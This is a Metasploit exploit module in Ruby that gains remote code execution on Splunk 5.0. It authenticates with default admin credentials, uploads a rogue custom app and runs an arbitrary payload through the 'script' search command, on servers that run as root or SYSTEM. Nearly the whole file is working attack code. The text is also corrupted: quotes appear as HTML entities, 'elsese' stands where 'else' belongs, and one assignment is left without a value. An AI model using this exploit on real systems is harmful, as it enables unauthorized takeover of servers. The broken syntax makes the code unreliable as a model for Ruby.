# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Splunk 5.0 Custom App Remote Code Execution&#039;,
      &#039;Description&#039;    => %q{
          This module exploits a feature of Splunk whereby a custom application can be
        uploaded through the web based interface. Through the &#039;script&#039; search command a
        user can call commands defined in their custom application which includes arbitrary
        perl or python code. To abuse this behavior, a valid Splunk user with the admin
        role is required. By default, this module uses the credential of "admin:changeme",
        the default Administrator credential for Splunk. Note that the Splunk web interface
        runs as SYSTEM on Windows, or as root on Linux by default. This module has only
        been tested successfully against Splunk 5.0.
      },
      &#039;Author&#039;         =>
        [
          "@marcwickenden", # discovery and metasploit module
          "sinn3r", # metasploit module
          "juan vazquez", # metasploit module
        ],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;References&#039;     =>
        [
          [ &#039;URL&#039;, &#039;http://blog.7elements.co.uk/2012/11/splunk-with-great-power-comes-great-responsibility.html&#039; ],
          [ &#039;URL&#039;, &#039;http://blog.7elements.co.uk/2012/11/abusing-splunk-with-metasploit.html&#039; ],
          [ &#039;URL&#039;, &#039;http://docs.splunk.com/Documentation/Splunk/latest/SearchReference/Script&#039; ]
        ],
      &#039;Payload&#039;        =>
        {
          &#039;Space&#039;       => 1024,
          &#039;DisableNops&#039; => true
        },
      &#039;Targets&#039;        =>
        [
          [ &#039;Splunk 5.0.1 / Linux&#039;,
            {
              &#039;Arch&#039;     => ARCH_CMD,
              &#039;Platform&#039; => [ &#039;linux&#039;, &#039;unix&#039; ]
            }
          ],
          [ &#039;Splunk 5.0.1 / Windows&#039;,
            {
              &#039;Arch&#039;     => ARCH_CMD,
              &#039;Platform&#039; => &#039;win&#039;
            }
          ]
        ],
      &#039;DisclosureDate&#039; => &#039;Sep 27 2012&#039;))

    register_options(
      [
        Opt::RPORT(8000),
        OptString.new(&#039;USERNAME&#039;, [ true, &#039;The username with admin role to authenticate as&#039;,&#039;admin&#039; ]),
        OptString.new(&#039;PASSWORD&#039;, [ true, &#039;The password for the specified username&#039;,&#039;changeme&#039; ]),
        OptPath.new(&#039;SPLUNK_APP_FILE&#039;,
          [
            true,
            &#039;The "rogue" Splunk application tgz&#039;,
            File.join(Msf::Config.install_root, &#039;data&#039;, &#039;exploits&#039;, &#039;splunk&#039;, &#039;upload_app_exec.tgz&#039;)
          ])
      ], self.class)

    register_advanced_options(
      [
        OptBool.new(&#039;ReturnOutput&#039;, [ true, &#039;Display command output&#039;, false ]),
        OptBool.new(&#039;DisableUpload&#039;, [ true, &#039;Disable the app upload if you have already performed it once&#039;, false ]),
        OptBool.new(&#039;EnableOverwrite&#039;, [true, &#039;Overwrites an app of the same name. Needed if you change the app code in the tgz&#039;, false]),
        OptInt.new(&#039;CommandOutputDelay&#039;, [true, &#039;Seconds to wait before requesting command output from Splunk&#039;, 5])
      ], self.class)
  end

  def exploit
    # process standard options
    @username = datastore[&#039;USERNAME&#039;]
    @password = datastore[&#039;PASSWORD&#039;]
    file_name = datastore[&#039;SPLUNK_APP_FILE&#039;]

    # process advanced options
    return_output = datastore[&#039;ReturnOutput&#039;]
    disable_upload = datastore[&#039;DisableUpload&#039;]
    @enable_overwrite = datastore[&#039;EnableOverwrite&#039;]
    command_output_delay = datastore[&#039;CommandOutputDelay&#039;]

    # set up some variables for later use
    @auth_cookies = &#039;&#039;
    @csrf_form_key = &#039;&#039;
    app_name = &#039;upload_app_exec&#039;
    p = payload.encoded
    print_status("Using command: #{p}")
    cmd = Rex::Text.encode_base64(p)

    # log in to Splunk (if required)
    do_login

    # fetch the csrf token for use in the upload next
    do_get_csrf(&#039;/en-US/manager/launcher/apps/local&#039;)

    unless disable_upload
      # upload the arbitrary command execution Splunk app tgz
      do_upload_app(app_name, file_name)
    end

    # get the next csrf token from our new app
    do_get_csrf("/en-US/app/#{app_name}/flashtimeline")

    # call our command execution function with the Splunk &#039;script&#039; command
    print_status("Invoking script command")
    res = send_request_cgi(
    {
      &#039;uri&#039;     => &#039;/en-US/api/search/jobs&#039;,
      &#039;method&#039;  => &#039;POST&#039;,
      &#039;cookie&#039;  => @auth_cookies,
      &#039;headers&#039; =>
        {
          &#039;X-Requested-With&#039; => &#039;XMLHttpRequest&#039;,
          &#039;X-Splunk-Form-Key&#039; => @csrf_form_key
        },
      &#039;vars_post&#039; =>
        {
          &#039;search&#039; => "search * | script msf_exec #{cmd}", # msf_exec defined in default/commands.conf
          &#039;status_buckets&#039; => "300",
          &#039;namespace&#039; => "#{app_name}",
          &#039;ui_dispatch_app&#039; => "#{app_name}",
          &#039;ui_dispatch_view&#039; => "flashtimeline",
          &#039;auto_cancel&#039; => "100",
          &#039;wait&#039; => "0",
          &#039;required_field_list&#039; => "*",
          &#039;adhoc_search_level&#039; => "smart",
          &#039;earliest_time&#039; => "0",
          &#039;latest_time&#039; => "",
          &#039;timeFormat&#039; => "%s.%Q"
        }
    })

    if return_output
      res.body.match(/data":\ "([0-9.]+)"/)
      job_id = $1

      # wait a short time to let the output be produced
      print_status("Waiting for #{command_output_delay} seconds to retrieve command output")
      select(nil,nil,nil,command_output_delay)
      job_output = fetch_job_output(job_id)
      if job_output.body.match(/Waiting for data.../)
        print_status("No output returned in time")
      elsese
        output = ""
        job_output.body.each_line do |line|
          # strip off the leading and trailing " added by Splunk
          line.gsub!(/^"/,"")
          line.gsub!(/"$/,"")
          output << line
        end

        # return the output
        print_status("Command returned:")
        print_line output
      end
    else
      handler
    end
  end

  def check
    # all versions are actually "vulnerable" but check implemented for future proofing
    # and good practice
    res = send_request_cgi(
    {
      &#039;uri&#039;     => &#039;/en-US/account/login&#039;,
      &#039;method&#039;  => &#039;GET&#039;
    }, 25)

    if res and res.body =~ /Splunk Inc\. Splunk/
      return Exploit::CheckCode::Appears
    else
      return Exploit::CheckCode::Safe
    end
  end

  def do_login
    print_status("Authenticating...")
    # this method borrowed with thanks from splunk_mappy_exec.rb
    res = send_request_cgi(
    {
      &#039;uri&#039;     => &#039;/en-US/account/login&#039;,
      &#039;method&#039;  => &#039;GET&#039;
    })

    cval = &#039;&#039;
    uid = &#039;&#039;
    session_id_port =
    session_id = &#039;&#039;
    if res and res.code == 200
      res.headers[&#039;Set-Cookie&#039;].split(&#039;;&#039;).each {|c|
        c.split(&#039;,&#039;).each {|v|
          if v.split(&#039;=&#039;)[0] =~ /cval/
            cval = v.split(&#039;=&#039;)[1]
          elsif v.split(&#039;=&#039;)[0] =~ /uid/
            uid = v.split(&#039;=&#039;)[1]
          elsif v.split(&#039;=&#039;)[0] =~ /session_id/
            session_id_port = v.split(&#039;=&#039;)[0]
            session_id = v.split(&#039;=&#039;)[1]
          end
        }
      }
    else
      fail_with(Exploit::Failure::NotFound, "Unable to get session cookies")
    end

    res = send_request_cgi(
    {
      &#039;uri&#039;     => &#039;/en-US/account/login&#039;,
      &#039;method&#039;  => &#039;POST&#039;,
      &#039;cookie&#039;  => "uid=#{uid}; #{session_id_port}=#{session_id}; cval=#{cval}",
      &#039;vars_post&#039; =>
        {
          &#039;cval&#039; => cval,
          &#039;username&#039; => @username,
          &#039;password&#039; => @password
        }
    })

    if not res or res.code != 303
      fail_with(Exploit::Failure::NoAccess, "Unable to authenticate")
    else
      session_id_port = &#039;&#039;
      session_id = &#039;&#039;
      res.headers[&#039;Set-Cookie&#039;].split(&#039;;&#039;).each {|c|
        c.split(&#039;,&#039;).each {|v|
          if v.split(&#039;=&#039;)[0] =~ /session_id/
            session_id_port = v.split(&#039;=&#039;)[0]
            session_id = v.split(&#039;=&#039;)[1]
          end
        }
      }
      @auth_cookies = "#{session_id_port}=#{session_id}"
    end
  end

  def do_upload_app(app_name, file_name)
    archive_file_name = ::File.basename(file_name)
    print_status("Uploading file #{archive_file_name}")
    file_data = ::File.open(file_name, "rb") { |f| f.read }

    boundary = &#039;--------------&#039; + rand_text_alphanumeric(6)

    data = "--#{boundary}\r\n"
    data << "Content-Disposition: form-data; name=\"splunk_form_key\"\r\n\r\n"
    data << "#{@csrf_form_key}"
    data << "\r\n--#{boundary}\r\n"

    if @enable_overwrite
      data << "Content-Disposition: form-data; name=\"force\"\r\n\r\n"
      data << "1"
      data << "\r\n--#{boundary}\r\n"
    end

    data << "Content-Disposition: form-data; name=\"appfile\"; filename=\"#{archive_file_name}\"\r\n"
    data << file_data
    data << "\r\n--#{boundary}--\r\n"

    res = send_request_cgi({
      &#039;uri&#039;     => &#039;/en-US/manager/appinstall/_upload&#039;,
      &#039;method&#039;  => &#039;POST&#039;,
      &#039;cookie&#039;  => @auth_cookies,
      &#039;ctype&#039;   => "multipart/form-data; boundary=#{boundary}",
      &#039;data&#039;    => data
    }, 30)

    if (res and (res.code == 303 or (res.code == 200 and res.body !~ /There was an error processing the upload/)))
      print_status("#{app_name} successfully uploaded")
    else
      fail_with(Exploit::Failure::Unknown, "Error uploading")
    end
  end

  def do_get_csrf(uri)
    print_status("Fetching csrf token from #{uri}")
    res = send_request_cgi(
    {
      &#039;uri&#039;    => uri,
      &#039;method&#039; => &#039;GET&#039;,
      &#039;cookie&#039; => @auth_cookies
    })
    res.body.match(/FORM_KEY":\ "(\d+)"/)
    @csrf_form_key = $1
    fail_with(Exploit::Failure::Unknown, "csrf form Key not found") if not @csrf_form_key
  end

  def fetch_job_output(job_id)
    # fetch the output of our job id as csv for easy parsing
    print_status("Fetching job_output for id #{job_id}")
    res = send_request_raw(
    {
      &#039;uri&#039;    => "/en-US/api/search/jobs/#{job_id}/result?isDownload=true&timeFormat=%25FT%25T.%25Q%25%3Az&maxLines=0&count=0&filename=&outputMode=csv&spl_ctrl-limit=unlimited&spl_ctrl-count=10000",
      &#039;method&#039; => &#039;GET&#039;,
      &#039;cookie&#039; => @auth_cookies,
      &#039;encode_param&#039; => &#039;false&#039;
    })
  end

end

